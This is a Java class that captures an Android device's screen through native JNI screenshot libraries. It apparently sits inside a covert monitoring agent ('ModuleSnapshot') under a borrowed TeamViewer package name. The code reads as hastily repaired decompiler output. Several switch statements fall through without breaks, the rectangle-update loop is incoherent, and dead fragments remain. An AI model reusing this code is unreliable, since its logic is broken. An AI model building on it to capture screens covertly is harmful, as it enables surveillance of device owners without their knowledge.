package com.teamviewer.teamviewerlib.ScreenCap;

import com.android.networking.auto.Cfg;
import com.android.networking.module.ModuleSnapshot;
import com.android.networking.util.Check;

import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Matrix;
import android.graphics.Rect;
import android.os.Build;
import android.util.Log;

public class JNICaptureScreenWrapper {
	private static final String TAG = "SnapshotJni"; //$NON-NLS-1$
	private ModuleSnapshot moduleSnapshot;

	private static JNICaptureScreenWrapper a;
	// private Display b =
	// ((WindowManager)TVApplication.a().getSystemService("window")).getDefaultDisplay();
	private Bitmap bitmap = null;
	private Bitmap bitmap2 = null;
	private Canvas canvas;
	private Bitmap f = null;
	private int format = 0;
	private int orientation = 0;
	private boolean init = false;
	private Rect[] rectangles = null;
	private Matrix matrix = null;

	public JNICaptureScreenWrapper(ModuleSnapshot moduleSnapshot) {
		this.moduleSnapshot = moduleSnapshot;

		try {
			if (Build.VERSION.SDK_INT >= 17)
				System.loadLibrary("jniscreenshot42");
			else if (Build.VERSION.SDK_INT >= 16)
				System.loadLibrary("jniscreenshot41");
			else
				System.loadLibrary("jniscreenshot23");
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " load library: " + ex);//$NON-NLS-1$
			}
		}
	}

	private int a(int paramInt, boolean paramBoolean) {
		switch (paramInt) {
		default:
			Log.d("JNICaptureScreenWrapper", "invalid screenshot orientation " + paramInt);
		case 0:
		case 1:
			if (!paramBoolean) {
				paramInt = 1;
			}
		case 2:
			if (!paramBoolean) {
				paramInt = 2;
			}
		case 3:
			if (!paramBoolean) {
				paramInt = 3;
			}
		}
		if (paramBoolean)
			paramInt = 0;

		return paramInt;

	}

	private native boolean jniBackupScreenshot();

	private native int jniCalcUpdateRects();

	private native boolean jniCaptureScreen();

	private native boolean jniCopyScreenshotDataToBitmap(Bitmap paramBitmap);

	private native int[] jniCopyUpdateRectsBottom();

	private native int[] jniCopyUpdateRectsLeft();

	private native int[] jniCopyUpdateRectsRight();

	private native int[] jniCopyUpdateRectsTop();

	private native int jniGetLastCaptureError();

	private native int jniGetScreenshotFormat();

	private native int jniGetScreenshotHeight();

	private native int jniGetScreenshotWidth();

	public boolean init() {
		// ScreenshotClient
		boolean b2 = jniBackupScreenshot();
		boolean bool1 = jniCaptureScreen();

		int w = jniGetScreenshotWidth();
		int h = jniGetScreenshotHeight();
		int format = jniGetScreenshotFormat();
		if ((w <= 0) || (h <= 0))
			Log.d("JNICaptureScreenWrapper", "prepareBitmap(): invalid screenshot size: width=" + w + ", height=" + h);

		if ((this.bitmap != null) && (this.bitmap.getWidth() == w) && (this.bitmap.getHeight() == h)
				&& (this.format == format)) {
			return false;
		}
		switch (format) {
		case 3:
		default:
			Log.d("JNICaptureScreenWrapper", "unsupported pixel format " + format);
		case 1:
		case 2:
		case 5:
		case 4:
		}

		Log.d("JNICaptureScreenWrapper", "creating ARGB_8888 bitmap width=" + w + " height=" + h + " format=" + format);
		this.bitmap = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888);
		this.format = format;
		this.init = true;
		switch (this.orientation) {
		case 2:
		default:
			int i2 = h;
			h = w;
			w = i2;
		case 1:
		case 3:
		}
		if ((this.bitmap2 == null) || (this.bitmap2.getWidth() != h) || (this.bitmap2.getHeight() != w)
				|| (this.bitmap2.getConfig() != this.bitmap.getConfig())) {
			this.bitmap2 = Bitmap.createBitmap(h, w, this.bitmap.getConfig());
			this.canvas = new Canvas(this.bitmap2);
		}
		if (this.init)
			m();
		// bool = true;
		// break;
		Log.d("JNICaptureScreenWrapper", "creating RGB_565 bitmap width=" + w + " height=" + h);
		this.bitmap = Bitmap.createBitmap(w, h, Bitmap.Config.RGB_565);
		this.format = format;
		return init;

	}

	private void m() {
		switch (this.orientation) {
		default:
			this.matrix = null;
		case 1:
			this.matrix = new Matrix();
			this.matrix.setRotate(270.0F);
			this.matrix.postTranslate(0.0F, this.bitmap.getWidth());
		case 2:
			this.matrix = new Matrix();
			this.matrix.setRotate(180.0F);
			this.matrix.postTranslate(this.bitmap.getWidth(), this.bitmap.getHeight());
		case 3:
			this.matrix = new Matrix();
			this.matrix.setRotate(90.0F);
			this.matrix.postTranslate(this.bitmap.getHeight(), 0.0F);
		}
	}

	private void copyOnCanvas() {
		switch (this.orientation) {
		default:
			Log.d("JNICaptureScreenWrapper", "invalid screenshot orientation " + this.orientation);
			this.f = this.bitmap;
		case 0:
		case 1:
		case 2:
		case 3:
		}

		this.f = this.bitmap;
		// continue;
		this.canvas.drawBitmap(this.bitmap, this.matrix, null);
		this.f = this.bitmap2;
		// }
	}

	public final int getError() {
		return jniGetLastCaptureError();
	}

	public final boolean d() {
		boolean bool = this.init;
		this.init = false;
		return bool;
	}

	public final int updateRectangles() {
		int m = jniCalcUpdateRects();
		if (m <= 0)
			;
		int[] arrayOfInt1;
		int[] arrayOfInt2;
		int[] arrayOfInt3;
		int[] arrayOfInt4;
		int n = 0;
		int i1 = 0;
		int i2 = 0;
		do {

			arrayOfInt1 = jniCopyUpdateRectsLeft();
			arrayOfInt2 = jniCopyUpdateRectsRight();
			arrayOfInt3 = jniCopyUpdateRectsTop();
			arrayOfInt4 = jniCopyUpdateRectsBottom();
			if ((arrayOfInt1 == null) || (arrayOfInt2 == null) || (arrayOfInt3 == null) || (arrayOfInt4 == null)
					|| (arrayOfInt1.length != m) || (arrayOfInt2.length != m) || (arrayOfInt3.length != m)
					|| (arrayOfInt4.length != m)) {
				m = -1;
			} else {
				this.rectangles = new Rect[m];
				if (this.rectangles != null)
					break;
				Log.d("JNICaptureScreenWrapper", "out of memory: cannot allocate memory for " + m + " rectangles");
				m = -1;
			}

			n = jniGetScreenshotWidth();
			i1 = jniGetScreenshotHeight();
			i2 = 0;
		} while (i2 >= m);

		this.rectangles[i2] = new Rect();
		switch (this.orientation) {
		default:
			this.rectangles[i2].left = arrayOfInt1[i2];
			this.rectangles[i2].right = arrayOfInt2[i2];
			this.rectangles[i2].top = arrayOfInt3[i2];
			this.rectangles[i2].bottom = arrayOfInt4[i2];
		case 1:
			this.rectangles[i2].left = arrayOfInt3[i2];
			this.rectangles[i2].right = arrayOfInt4[i2];
			this.rectangles[i2].top = (n - 1 - arrayOfInt2[i2]);
			this.rectangles[i2].bottom = (n - 1 - arrayOfInt1[i2]);
		case 2:
			this.rectangles[i2].left = (n - 1 - arrayOfInt2[i2]);
			this.rectangles[i2].right = (n - 1 - arrayOfInt1[i2]);
			this.rectangles[i2].top = (i1 - 1 - arrayOfInt4[i2]);
			this.rectangles[i2].bottom = (i1 - 1 - arrayOfInt3[i2]);
		case 3:
			this.rectangles[i2].left = (i1 - 1 - arrayOfInt4[i2]);
			this.rectangles[i2].right = (i1 - 1 - arrayOfInt3[i2]);
			this.rectangles[i2].top = arrayOfInt1[i2];
			this.rectangles[i2].bottom = arrayOfInt2[i2];
		}
		// while (true) {
		// i2++;
		// break;
		// }
		return i2 + 1;
	}

	public final Rect[] getRectangles() {
		return this.rectangles;
	}

	public final int g() {
		int m;
		switch (this.orientation) {
		default:
			m = 0;
		case 0:
		case 2:
			m = jniGetScreenshotWidth();
		case 1:
		case 3:
			m = jniGetScreenshotHeight();
		}
		return m;
	}

	public final int h() {
		int m;
		switch (this.orientation) {
		default:
			m = 0;
		case 0:
		case 2:
			m = jniGetScreenshotHeight();
		case 1:
		case 3:
			m = jniGetScreenshotWidth();
		}

		return m;

	}

	public final boolean drawCanvas() {
		if (!jniCopyScreenshotDataToBitmap(this.bitmap))
			return false;

		copyOnCanvas();
		return true;
	}

	public final Bitmap getBitmap() {
		return this.f;
	}

	public final boolean backupScreenshot() {
		return jniBackupScreenshot();
	}
}
